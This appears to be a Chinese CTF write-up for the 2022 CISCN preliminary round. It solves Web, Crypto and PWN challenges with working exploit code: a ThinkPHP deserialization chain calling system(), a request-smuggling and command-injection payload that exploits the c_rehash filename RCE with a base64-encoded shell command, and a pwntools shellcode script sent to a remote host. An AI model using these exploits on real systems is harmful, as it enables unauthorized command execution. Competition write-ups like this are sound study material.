# Web

## Ezpop

```php
<?php
namespace think{
    abstract class Model{
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj = ''){
            $this->lazySave = True;
            $this->data = ['whoami' => ['cat /*']];
            $this->exists = True;
            $this->table = $obj;
            $this->withAttr = ['whoami' => ['system']];
            $this->json = ['whoami',['whoami']];
            $this->jsonAssoc = True;
        }
    }
}
namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }
}

namespace{
    echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot()))));
}
```

## online_crt

c_rehash最近出了个rce的洞：

https://www.openssl.org/news/secadv/20220503.txt

大致看一下题目给的代码和漏洞描述：

![image-20220529160200097](2022-CISCN-%E5%88%9D%E8%B5%9B-Writeup.assets/image-20220529160200097.png)

大致能感觉到就是因为crt文件名被直接传进了要执行的命令中，可以直接利用反引号执行（或者`${}`）

python代码中的proxy那个点，直接利用闭合和换行即可构造http请求。go的代码：

```go
	if c.Request.URL.RawPath != "" && c.Request.Host == "admin" {
		err := os.Rename(staticPath+oldname, staticPath+newname)
		if err != nil {
			return
		}
		c.String(200, newname)
		return
	}
```

RawPath查一下：https://www.ipeapea.cn/post/go-url/，需要路径加个URL编码才行。

之后就是改文件名然后利用漏洞rce。先改文件名：

```
uri=/%2561dmin/rename?oldname=a5b4417a-d220-4b01-85e0-539ef78d061f.crt%26newname=`echo%2520Y2F0IC8qIA==|base64%2520--decode|bash>flag.txt`.crt HTTP/1.1
Host: admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

asafsfs=
```



![image-20220529160824370](2022-CISCN-%E5%88%9D%E8%B5%9B-Writeup.assets/image-20220529160824370.png)

访问createlink执行命令后读flag即可：

```
flag{4a2296c0-bf54-41fc-84b8-ff7769019425}
```



# Crypto

## 基于挑战码的双向认证

前两题非预期直接读flag

cd /root/cube-shell/instance/flag_server

cat flag1.txt

cat flag2.txt

第三题root默认密码，直接`su root`成为root后读flag，



## 签到

原文“弼时安全到达了”所对应的7个电码：
1732 2514 1344 0356 0451 6671 0055
随机密码：6089 0451 8531 3950 5611 5856 4546

模10运算得到：7711 2965 9875 3206 5062 1427 4591

http://eci-2zebelhabwvwhwux6eqf.cloudeci1.ichunqiu.com:8888/send?msg=7711296598753206506214274591

![image-20220529165848466](2022-CISCN-%E5%88%9D%E8%B5%9B-Writeup.assets/image-20220529165848466.png)

## ISO9798

```python
#sha256爆破脚本
import hashlib
import itertools
from string import digits, ascii_letters
alpha_bet=digits+ascii_letters
strlist = itertools.product(alpha_bet, repeat=4)

sha256="206af145b10e79e0bdde11d373e47d0700296edd1ec9162b1078a5f3fc7c2d5a"
tail="3fv7jk6rUsgTbXBJ"

xxxx=''

for i in strlist:
    data=i[0]+i[1]+i[2]+i[3]
    data_sha=hashlib.sha256((data+str(tail)).encode('utf-8')).hexdigest()
    if(data_sha==sha256):
        xxxx=data
        break

print(xxxx)
```

给定任意rB后得到对应字串，按32位分段得到：

```
rA = ed166e26f755eed72e0a1af36a1f9a72
rB = 6c6369633573c9157d8cec33da21a711
rB||rA = 6c6369633573c9157d8cec33da21a711ed166e26f755eed72e0a1af36a1f9a72
```

![image-20220529165940415](2022-CISCN-%E5%88%9D%E8%B5%9B-Writeup.assets/image-20220529165940415.png)

# PWN

## login-nomal

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# 写一下shellcode
# f = open('./shellcode.bin','wb')
# shellcode = asm(shellcraft.amd64.sh())
# f.write(shellcode)
# f.close

#把shellcode转为可视化字符串
# python ./ALPHA3.py x64 ascii mixedcase rdx --input="shellcode.bin" > payload.bin


# io = process('./login')
io = remote('59.110.105.63',41172)
elf = ELF('./login')

f = open('payload.bin','rb')
payload = f.read()

io.recvuntil(b">>>")
io.sendline(b'opt:1\r\nmsg:ro0t\r\n')

io.recvuntil(b">>>")
io.sendline(b'opt:2\r\nmsg:'+payload+b'\r\n')
io.interactive()

```

![17DBBA80038857AC5F89F43E16FC69B8](2022-CISCN-%E5%88%9D%E8%B5%9B-Writeup.assets/17DBBA80038857AC5F89F43E16FC69B8.png)